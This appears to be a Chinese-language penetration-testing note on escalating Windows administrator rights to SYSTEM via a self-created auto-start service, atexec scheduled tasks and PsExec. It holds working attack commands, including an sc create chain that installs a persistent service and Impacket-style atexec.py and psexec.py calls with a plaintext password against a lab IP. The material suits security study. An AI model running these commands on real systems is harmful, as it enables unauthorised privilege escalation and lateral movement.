---
title: Windows_Service提权
date: 2025-03-03 14:03:05
updated: 2025-03-03 14:15:11
tags:
  - 内网
  - 权限提升
---
# 原始方法

• 在拥有 administrator 权限之后利用 windows 系统服务可以将目前的权限提升为 system

• 利用的是 windows 系统服务将会以 **system** 权限去启动服务的特性

```shell
sc create "scAutoRunTest" binpath="cmd /c start /b C:\Users\Public\scAutoRunTest.exe"&&sc description "scAutoRunTest" "scAutoRunTest"&&sc config "scAutoRunTest" start=auto&&sc start "scAutoRunTest"

# 查询SC服务
sc qc scAutoRunTest
# 删除SC服务
sc delete scAutoRunTest
```

# atexec

[schtasks 命令](https://learn.microsoft.com/zh-cn/windows-server/administration/windows-commands/schtasks)

原理类似，利用 administrator 账号权限去创建一个以 system 权限运行的计划任务从而达到 administrator-->system 的效果

```python
python3 atexec.py 'administrator:1qaz@WSX'@192.168.135.135 whoami
```

# psexec

PsExec 利用某一个账号，通过 SMB 协议连接远程机器的命名管道（基于 SMB的 RPC），在远程机器上创建并启动一个名为 **PSEXESVC 服务**，从而获得了system 权限。

<details open>
<summary>使用 PsExec 的最低要求</summary>

1、远程机器的 139 或 445 端口需要开启状态，即 SMB；

2、明文密码或者 NTLM 哈希；

3、具备将文件写入共享文件夹的权限；

4、能够在远程机器上创建服务：SC\_MANAGER\_CREATE\_SERVICE (访问掩码：0x0002)；

5、能够启动所创建的服务：SERVICE\_QUERY\_STATUS（访问掩码：0x0004）+ SERVICE\_START（访问掩码：0x0010）

</details>
<details open>
<summary>过程</summary>

• 将**PSEXESVC.exe**上传到 ADMIN$ (指向/admin$/system32/PSEXESVC.EXE)共享文件夹内；

• 远程创建用于运行 PSEXESVC.exe 的服务；

• 远程启动服务。

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1741010936981-7c216b47-50bf-47fa-bef7-96d6889a2e57.png)

</details>

```python
python3 psexec.py 'administrator:1qaz@WSX'@192.168.135.135
```